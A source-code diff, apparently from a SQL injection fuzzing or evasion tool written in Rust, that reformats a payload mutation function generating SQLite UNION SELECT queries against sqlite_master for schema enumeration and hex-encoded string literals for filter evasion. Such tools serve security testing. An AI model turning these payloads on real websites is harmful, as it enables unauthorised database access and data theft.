@@ -41,9 +41,7 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<String> {
     // ── sqlite_master schema enumeration ──
     if results.len() < max_mutations {
         let base = payload.trim_end_matches("--").trim_end_matches('#');
-        results.push(format!(
-            "{base} UNION SELECT name,sql FROM sqlite_master--"
-        ));
+        results.push(format!("{base} UNION SELECT name,sql FROM sqlite_master--"));
         results.push(format!(
             "{base} UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--"
         ));
@@ -67,18 +65,19 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<String> {
 
     // ── Unicode string via X'hex' notation ──
     if let Some(start) = payload.find('\'')
-        && let Some(end) = payload[start + 1..].find('\'') {
-            let inner = &payload[start + 1..start + 1 + end];
-            if !inner.is_empty() && inner.len() <= 15 && results.len() < max_mutations {
-                let hex: String = inner.bytes().map(|b| format!("{b:02x}")).collect();
-                results.push(format!(
-                    "{}X'{}'{}",
-                    &payload[..start],
-                    hex,
-                    &payload[start + 1 + end + 1..]
-                ));
-            }
+        && let Some(end) = payload[start + 1..].find('\'')
+    {
+        let inner = &payload[start + 1..start + 1 + end];
+        if !inner.is_empty() && inner.len() <= 15 && results.len() < max_mutations {
+            let hex: String = inner.bytes().map(|b| format!("{b:02x}")).collect();
+            results.push(format!(
+                "{}X'{}'{}",
+                &payload[..start],
+                hex,
+                &payload[start + 1 + end + 1..]
+            ));
         }
+    }
 
     // ── printf() string construction ──
     if results.len() < max_mutations {
